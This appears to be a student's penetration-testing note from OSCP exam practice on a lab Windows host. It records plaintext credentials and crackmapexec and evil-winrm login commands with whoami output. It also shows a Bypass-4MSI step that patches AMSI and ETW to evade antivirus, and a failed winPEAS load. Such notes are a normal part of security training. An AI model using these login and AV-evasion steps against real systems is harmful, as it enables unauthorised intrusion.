# Info  

```
WinRM was possibly detected running on tcp port 5985.

192.168.114.206
domain: oscp.exam 
Username: r.andrews
Password: BusyOfficeWorker890


crackmapexec winrm 192.168.114.206 -d 'oscp.exam' -u 'r.andrews' -p 'BusyOfficeWorker890'

evil-winrm -u 'r.andrews' -p 'BusyOfficeWorker890' -i 192.168.114.206
```

![[{9B55F53D-AA74-45EA-B0B1-DE3501603A33}.png]]

route print
 
![[{9FDEC911-B21A-48CF-8B4C-8076E011DFEF}.png]]

whoanmi /priv
![[{D17E4A18-07E0-49ED-8246-07263978FC16}.png]]

whoami /all
![[{CA8A2C8F-835B-4705-BA62-3F24BE990064}.png]]


whoami /user
```
*Evil-WinRM* PS C:\Users\r.andrews\Documents> whoami /user

USER INFORMATION
----------------

User Name      SID
============== ==============================================
oscp\r.andrews S-1-5-21-2468442526-2906141135-4054829294-1105

```

get file from vm

![[{FB3A9F44-C6B9-48A8-A07B-9CE5747D6B48}.png]]

can do anything as user got no permission, script is disabled for this system, maybe winpeas might work

```

┌──(kali㉿kali)-[~/OSCP/Exam/AD/192.168.114.206]
└─$ evil-winrm -u 'r.andrews' -p 'BusyOfficeWorker890' -i 192.168.114.206 -e /home/kali/OSCP/Exam/AD/192.168.114.206  
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Bypass-4MSI  
Warning: AV could be still watching for suspicious activity. Waiting for patching...  
Info: Patching 4MSI, please be patient...
[+] Success!   
Info: Patching ETW, please be patient ..    
[+] Success!
*Evil-WinRM* PS C:\Users\r.andrews\Documents> menu 
Info: Bypass-4MSI is loaded. Trying to load utilities


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\r.andrews\Documents> Invoke-Binary /home/kali/OSCP/Exam/AD/192.168.114.206/winPEASx64.exe    
Error: Check filenames
*Evil-WinRM* PS C:\Users\r.andrews\Documents> 

```

cant run exe file 